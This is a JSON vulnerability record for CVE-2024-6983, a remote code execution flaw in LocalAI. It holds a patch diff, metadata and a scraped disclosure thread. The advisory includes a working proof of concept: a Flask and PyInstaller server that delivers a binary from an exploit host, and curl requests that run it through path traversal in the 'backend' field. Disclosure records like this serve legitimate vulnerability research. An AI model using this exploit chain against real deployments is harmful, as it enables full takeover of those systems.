{
    "CVE-2024-6983": {
        "published_date": "2024-09-27T15:43:51.011Z",
        "patch_commits": [
            {
                "url": "https://github.com/mudler/localai/commit/d02a0f6f01d5c4a926a2d67190cb55d7aca23b66",
                "content": "ci: add llvm dependencies\n\nSigned-off-by: Ettore Di Giacinto <mudler@users.noreply.github.com>\n\nFilename: Dockerfile:\n```\n@@ -81,7 +81,7 @@\nRUN apt-get update && \\\n         espeak \\\n         python3-pip \\\n         python-is-python3 \\\n-        python3-dev \\\n+        python3-dev lsb_release wget add-apt-repository gpg \\\n         python3-venv && \\\n     apt-get clean && \\\n     rm -rf /var/lib/apt/lists/* && \\\n```"
            }
        ],
        "sw_version": "v2.19.3",
        "sw_version_wget": "https://github.com/mudler/localai/archive/refs/tags/v2.19.3.zip",
        "description": "mudler/localai version 2.17.1 is vulnerable to remote code execution. The vulnerability arises because the localai backend receives inputs not only from the configuration file but also from other inputs, allowing an attacker to upload a binary file and execute malicious code. This can lead to the attacker gaining full control over the system.",
        "sec_adv": [
            {
                "url": "https://huntr.com/bounties/f91fb287-412e-4c89-87df-9e4b6e609647",
                "content": "Bounties\nPartners\nCommunity\nInfo\nSUBMIT REPORT\nRemote Code Execution in mudler/localai\nValid\nReported on Jun 22nd 2024\nDescription\nAfter this report, I had the opportunity to delve a bit deeper and discovered that the localai backend receives inputs not only from the configuration file but also from other inputs. Therefore, we see that the vulnerability still persists.\nProof of Concept\nWe are using the following payload to upload the binary file to the server. Other methods are available, but I chose this one because we are familiar with it.\nname: \"life\"\n\ndownload_files:\n  - filename: \"app.bin\"\n    uri: \"<exploit_server_url>/app.bin\"\nPython script to automate these steps:\nfrom flask import Flask,send_file,request\nimport tempfile\nimport PyInstaller.__main__\nimport os\n\napp=Flask(__name__)\n\nCONF=\"\"\"name: \"life\"\n\ndownload_files:\n  - filename: \"app.bin\"\n    uri: \"{0}app.bin\"\n\"\"\"\n\n# Builds exploit code\ndef build():\n    CODE = 'open(\"/tmp/test.txt\",\"a\").write(\"1337\")' # Python code we want to run\n    appname=\"app.bin\"\n    if os.path.isfile(appname):\n        return appname\n    with tempfile.NamedTemporaryFile(delete=False) as fp:\n        fp.write(CODE.encode())\n        fp.close()\n        PyInstaller.__main__.run([\"--onefile\",\"--clean\",\"--workpath\",\"/tmp/build/\",\"--specpath\",\"/tmp\",\"--distpath\",\".\",\"-n\",appname,fp.name])\n    return appname\n\n# Serve model.yaml file\n@app.get(\"/model.yaml\")\ndef model():\n    return CONF.format(request.root_url)\n\n# Serve app.bin file\n@app.get(\"/app.bin\")\ndef files():\n    return send_file(build())\n\n# Start the server\napp.run(\"0.0.0.0\",8000)\nWe upload the model file and inject our malicious backend file.\ncurl http://localhost:8080/models/apply -X POST -H \"Content-Type: application/json\" -d '{\"name\":\"life\",\"config_url\":\"<exploit_server_url>/model.yaml\",\"id\":\"\"}'\n\ncurl http://localhost:8080/embeddings -X POST -H \"Content-Type: application/json\" -d '{\"backend\":\"../../../../../../build/models/app.bin\",\"model\":\"life\",\"input\":\"hi\"}'\nImpact\nAllows the attacker to execute malicious code, gaining full control over the system.\nOccurrences\ninitializers.go L336\nWe are processing your report and will contact themudler/localai team within 24 hours.a year ago\nWe have contacted a member of themudler/localai team and are waiting to hear backa year ago\nEttore Di Giacinto\ncommenteda year ago\nMaintainer\nHi - thanks for the report - are you sure this works with the latest version of LocalAI?\nOne thing is that I would like to discuss also - the CVE severity: while the attack is genuinely possible, LocalAI's access can be gated by API_KEYS which increases the attack complexity, as an attacker would need to know the API_KEYS in order to trigger the vulnerability.\nWhile by default API_KEYS are not set, as LocalAI usage is intended primarly for local use, if exposing LocalAI outside these should be used.\nA mudler/localai maintainerhas acknowledged this reporta year ago\nThe scheduled publication date was automatically extended from 20th Sep 2024  to 27th Sep 2024  due to the maintainers acknowledgement of the reporta year ago\nEttore Di Giacinto\ncommenteda year ago\nMaintainer\nWhile still waiting for confirmation if the latest version is affected - I've added extra checks on https://github.com/mudler/LocalAI/pull/2647 to avoid in the future that backends outside the backend asset dir can be called generically.\nmvlttt\ncommenteda year ago\nResearcher\nHi @mudler ,yes, I am sure that this is the latest version (2.17.1), I started the application like this.\ndocker run -p 8080:8080 --name local-ai -ti localai/localai:latest-aio-cpu\nBut I will also test the vulnerability with the installation method you have newly added for you.\ncurl https://localai.io/install.sh | sh\nDuring the vulnerability investigation, the application is considered as its default state; the user can change many settings and this is ignored. If you want to discuss it in more detail or have anything you want to ask, you can contact me too on discord.\nEttore Di Giacinto\ncommenteda year ago\nMaintainer\n@mvlttt thanks for confirming. while defaults are just \"defaults\" it should be considered while assessing a CVE - if LocalAI is exposed outside, endpoints should be protected adeguately. I do agree that there is a security flaw, but the CVE should take into account that privileges are required.\nIf we wouldn't consider this, then potentially all REST API applications that by default don't have tokens or some sort of authentication would have to be considered \"unsecure\".\nmvlttt\ncommenteda year ago\nResearcher\n@mudler , yes, you are actually partly right, an unauthorized endpoint is a \"high risk\" target rather than an \"unsafe\" target.If you want, the huntr team can also take a look.\nmvlttt\ncommenteda year ago\nResearcher\nHi @mudler , I tested it again for you and when run with the new installation method, the models are loaded under the /models path, so after repeating the steps in the report, we can exploit it as follows:\ncurl http://localhost:8080/embeddings -X POST -H \"Content-Type: application/json\" -d '{\"backend\":\"../../../../../../models/app.bin\",\"model\":\"life\",\"input\":\"hi\"}'\nYou can see the test.txt file in the /tmp folder\nDan McInerney\ncommenteda year ago\nAdmin\nWe have a policy of generally siding with maintainers when there's some grey area of setting CVSS scores. I think it's reasonable to set privileges to Low in this case for the reasons the maintainer outlined. Technically, one could argue to set them to High since it appears the API_KEYS just have one permission level (admin essentially), however Low is a decently accurate description given the fact that a default deployment doesn't have API_KEYS set automatically and from looking at the documentation, there's not a lot of clues or warning about not exposing it to the network.\nDan McInerneymodified the Severity from Critical (9.8) to High (8.8)a year ago\nDave\ncommented10 months ago\nMaintainer\n@mudler I think there might still be something here - running some tests today / this weekend and will update soon.\nEttore Di Giacinto\ncommented10 months ago\nMaintainer\nI've added generically a guard against running backends outside the asset dir: https://github.com/mudler/LocalAI/blob/f19ee465d2c0ee66cc56b6918311a46020df8a6b/pkg/model/initializers.go#L322 PR: https://github.com/mudler/LocalAI/pull/2647\nmvlttt\ncommented10 months ago\nResearcher\nHi @mudler,I will review the fix, by the way, can you verify the report?\nmvlttt\ncommented10 months ago\nResearcher\nHi @dave-gray101 @mudler, fix is working.\nThe researcher has received a minor penalty to their credibility for miscalculating the severity: -1\nMarcello validated this vulnerability10 months ago\nmvlttthas been awarded the disclosure bounty\nThe fix bounty is now up for grabs\nThe researcher's credibility has increased: +7\nCVE-2024-6983assigned to this report.10 months ago\nEttore Di Giacintomarked this as fixedin 2.19.4with commitd02a0f9 months ago\nEttore Di Giacintohas been awarded the fix bounty\ninitializers.go#L336 has been validated\nWe have notified the mudler/localai maintainers about this report in their weekly follow-up8 months ago\nWe have sent a warning to the mudler/localai team to inform them that this report will be published in 48 hours8 months ago\nThis vulnerability has now been published8 months ago\nCVE-2024-6983has now been published8 months ago\nSign in to join this conversation\nCVE\nCVE-2024-6983\n(Published)\nVulnerability Type\nCWE-94: Code Injection\nSeverity\nHigh (8.8)\nAttack vector\nNetwork\nAttack complexity\nLow\nPrivileges required\nLow\nUser interaction\nNone\nScope\nUnchanged\nConfidentiality\nHigh\nIntegrity\nHigh\nAvailability\nHigh\nOpen in visual CVSS calculator\nRegistry\nPypi\nAffected Version\n2.17.1\nVisibility\nPublic\nStatus\nFixed\nDisclosure Bounty\n$450\nFix Bounty\n$112.5\nFound by\nFixed by\nSupported by Protect AI and leading the way to MLSecOps and greater AI security.\nÂ© 2024\nPrivacy Policy\nTerms of Service\nCode of Conduct\nCookie Preferences\nContact Us",
                "effective": true,
                "effective_reason": "The advisory includes a detailed proof of concept script and procedures to demonstrate the vulnerability."
            }
        ],
        "cwe": [
            {
                "id": "CWE-94",
                "value": "CWE-94 Improper Control of Generation of Code"
            }
        ]
    }
}